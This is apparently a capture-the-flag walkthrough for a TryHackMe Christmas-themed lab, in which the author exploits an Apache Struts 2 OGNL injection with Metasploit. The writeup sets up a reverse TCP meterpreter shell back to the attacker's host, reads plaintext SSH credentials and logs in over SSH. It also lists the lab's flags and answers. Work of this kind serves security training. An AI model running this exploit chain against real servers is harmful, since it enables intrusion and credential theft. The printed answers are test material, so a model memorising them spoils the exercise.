# [Day 10] Metasploit-a-ho-ho-ho

## Description

Once deployed, the machine will take 4 to 5 minutes to boot and configure. Please be patient.

Hi Lindsey here. I've been a great Elf all year, but there was one incident and now I think I'm on Santa's naughty list.

What? You didn't think us elves got presents too? Well we do and we get first pick of the pressies!

Can you help me hack into Santa's system that keeps track of the naughty and nice people to see if I am on it?

Check out the [blog post](https://blog.tryhackme.com/metasploit/) shown above to help you on this task.

## #1 - Compromise the web server using Metasploit. What is flag1?

Let's scan the IP first.
~~~
msf5 > db_nmap -sV -A 10.10.223.120
[*] Nmap: Starting Nmap 7.60 ( https://nmap.org ) at 2020-05-02 08:05 PDT
[*] Nmap: Nmap scan report for 10.10.223.120
[*] Nmap: Host is up (0.067s latency).
[*] Nmap: Not shown: 997 closed ports
[*] Nmap: PORT    STATE SERVICE VERSION
[*] Nmap: 22/tcp  open  ssh     OpenSSH 7.4 (protocol 2.0)
[*] Nmap: | ssh-hostkey:
[*] Nmap: |   2048 17:9c:ec:ca:76:82:52:1e:34:3c:a7:50:94:89:a6:4d (RSA)
[*] Nmap: |   256 3a:23:45:7f:b5:d9:09:16:29:60:7e:67:93:f5:f3:bb (ECDSA)
[*] Nmap: |_  256 02:e8:a8:36:6d:be:fa:4d:e7:56:c2:24:51:55:32:bd (EdDSA)
[*] Nmap: 80/tcp  open  http    Apache Tomcat/Coyote JSP engine 1.1
[*] Nmap: |_http-server-header: Apache-Coyote/1.1
[*] Nmap: | http-title: Santa Naughty and Nice Tracker
[*] Nmap: |_Requested resource was showcase.action
[*] Nmap: 111/tcp open  rpcbind 2-4 (RPC #100000)
[*] Nmap: | rpcinfo:
[*] Nmap: |   program version   port/proto  service
[*] Nmap: |   100000  2,3,4        111/tcp  rpcbind
[*] Nmap: |   100000  2,3,4        111/udp  rpcbind
[*] Nmap: |   100024  1          60241/tcp  status
[*] Nmap: |_  100024  1          60542/udp  status
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 12.63 seconds
~~~

Nmap reveals a web service running on port `80/tcp`, identified as `Apache Tomcat/Coyote JSP engine 1.1`. When we connect to the web server, we are redirected to `/showcase.action`.

Googling for the terms `apache` and `showcase.action` confirms that the server is probably running Struts 2.

Let's find an exploit.

~~~
$ msfconsole -q 
msf5 > search struts2

Matching Modules
================

   #  Name                                             Disclosure Date  Rank       Check  Description
   -  ----                                             ---------------  ----       -----  -----------
   0  exploit/multi/http/struts2_code_exec_showcase    2017-07-07       excellent  Yes    Apache Struts 2 Struts 1 Plugin Showcase OGNL Code Execution
   1  exploit/multi/http/struts2_content_type_ognl     2017-03-07       excellent  Yes    Apache Struts Jakarta Multipart Parser OGNL Injection
   2  exploit/multi/http/struts2_namespace_ognl        2018-08-22       excellent  Yes    Apache Struts 2 Namespace Redirect OGNL Injection
   3  exploit/multi/http/struts2_rest_xstream          2017-09-05       excellent  Yes    Apache Struts 2 REST Plugin XStream RCE
   4  exploit/multi/http/struts_code_exec_classloader  2014-03-06       manual     No     Apache Struts ClassLoader Manipulation Remote Code Execution
   5  exploit/multi/http/struts_code_exec_parameters   2011-10-01       excellent  Yes    Apache Struts ParametersInterceptor Remote Code Execution
   6  exploit/multi/http/struts_dev_mode               2012-01-06       excellent  Yes    Apache Struts 2 Developer Mode OGNL Execution
~~~

I tried exploit #0 (`exploit/multi/http/struts2_code_exec_showcase`) but it did not work. I then continued with #1 (`exploit/multi/http/struts2_content_type_ognl`). Let's see the options:

~~~
msf5 > use 1
msf5 exploit(multi/http/struts2_content_type_ognl) > show options

Module options (exploit/multi/http/struts2_content_type_ognl):

   Name       Current Setting     Required  Description
   ----       ---------------     --------  -----------
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                         yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      8080                yes       The target port (TCP)
   SSL        false               no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /struts2-showcase/  yes       The path to a struts application action
   VHOST                          no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   Universal
~~~

Let's set the `RHOST`, `RPORT` and `TARGETURI`:

~~~
msf5 exploit(multi/http/struts2_content_type_ognl) > set RHOST 10.10.223.120
RHOST => 10.10.223.120
msf5 exploit(multi/http/struts2_content_type_ognl) > set RPORT 80
RPORT => 80
msf5 exploit(multi/http/struts2_content_type_ognl) > set TARGETURI /showcase.action
TARGETURI => /showcase.action
~~~

Now, as we want to have a reverse shell, let's find one:

~~~
msf5 exploit(multi/http/struts2_content_type_ognl) > search linux/x86/meterpreter/reverse_tcp

Matching Modules
================

   #  Name                                            Disclosure Date  Rank    Check  Description
   -  ----                                            ---------------  ----    -----  -----------
   0  payload/linux/x86/meterpreter/reverse_tcp                        normal  No     Linux Mettle x86, Reverse TCP Stager
   1  payload/linux/x86/meterpreter/reverse_tcp_uuid                   normal  No     Linux Mettle x86, Reverse TCP Stager


msf5 exploit(multi/http/struts2_content_type_ognl) > set PAYLOAD payload/linux/x86/meterpreter/reverse_tcp
PAYLOAD => linux/x86/meterpreter/reverse_tcp
~~~

Now, let's set up our `LHOST`:

~~~
msf5 exploit(multi/http/struts2_content_type_ognl) > show options

Module options (exploit/multi/http/struts2_content_type_ognl):

   Name       Current Setting   Required  Description
   ----       ---------------   --------  -----------
   Proxies                      no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.10.223.120     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80                yes       The target port (TCP)
   SSL        false             no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /showcase.action  yes       The path to a struts application action
   VHOST                        no        HTTP server virtual host


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Universal


msf5 exploit(multi/http/struts2_content_type_ognl) > set LHOST 10.9.35.106
LHOST => 10.9.35.106
~~~

We are good to exploit:

~~~
msf5 exploit(multi/http/struts2_content_type_ognl) > exploit 

[*] Started reverse TCP handler on 10.9.35.106:4444 
[*] Sending stage (980808 bytes) to 10.10.223.120
[*] Meterpreter session 1 opened (10.9.35.106:4444 -> 10.10.223.120:39532) at 2020-05-02 09:17:24 -0700

meterpreter >
~~~

Great, we have a meterpreter. Now, let's open a shell to find our flag:

~~~
meterpreter > shell
Process 70 created.
Channel 1 created.
find / 2>/dev/null | grep -i flag
/sys/devices/pnp0/00:06/tty/ttyS0/flags
/sys/devices/platform/serial8250/tty/ttyS2/flags
/sys/devices/platform/serial8250/tty/ttyS3/flags
/sys/devices/platform/serial8250/tty/ttyS1/flags
/sys/devices/virtual/net/lo/flags
/sys/devices/virtual/net/eth0/flags
/sys/module/scsi_mod/parameters/default_dev_flags
/proc/sys/kernel/acpi_video_flags
/proc/kpageflags
/usr/lib/x86_64-linux-gnu/perl/5.20.2/bits/waitflags.ph
/usr/local/tomcat/webapps/ROOT/ThisIsFlag1.txt
/flag-dir
^C
Terminate channel 1? [y/N]  y
~~~

We have located our flag (`/usr/local/tomcat/webapps/ROOT/ThisIsFlag1.txt`). Let's use `cat` to show the flag:

~~~
meterpreter > cat /usr/local/tomcat/webapps/ROOT/ThisIsFlag1.txt
THM{3ad96bb13ec963a5ca4cb99302b37e12}
meterpreter > 
~~~

## #2 - Now you've compromised the web server, get onto the main system. What is Santa's SSH password?

Let's check what we have in Santa's `home`:

~~~
meterpreter > cd /home
meterpreter > ls
Listing: /home
==============

Mode             Size  Type  Last modified              Name
----             ----  ----  -------------              ----
40755/rwxr-xr-x  4096  dir   2019-12-08 13:12:45 -0800  santa

meterpreter > cd santa
meterpreter > ls
Listing: /home/santa
====================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  30    fil   2019-12-08 13:12:44 -0800  ssh-creds.txt

meterpreter > cat ssh-creds.txt
santa:rudolphrednosedreindeer
~~~

That was easier than expected :)

Answer: `rudolphrednosedreindeer`

## #3 - Who is on line 148 of the naughty list?

Now, we can connect directly with `ssh santa@10.10.223.120` and password `rudolphrednosedreindeer`. Let's search for a file which would be the *naughty list*:

~~~
[santa@ip-10-10-223-120 ~]$ cd / && find / -iname *naughty* 2>/dev/null
/home/santa/naughty_list.txt
[santa@ip-10-10-223-120 /]$ sed -n 148p /home/santa/naughty_list.txt 
Melisa Vanhoose
~~~

## #4 - Who is on line 52 of the nice list?

The *nice list* is also in Santa's `home` directory. Let's find the name on line 52:
~~~
[santa@ip-10-10-223-120 ~]$ sed -n 52p /home/santa/nice_list.txt 
Lindsey Gaffney
~~~
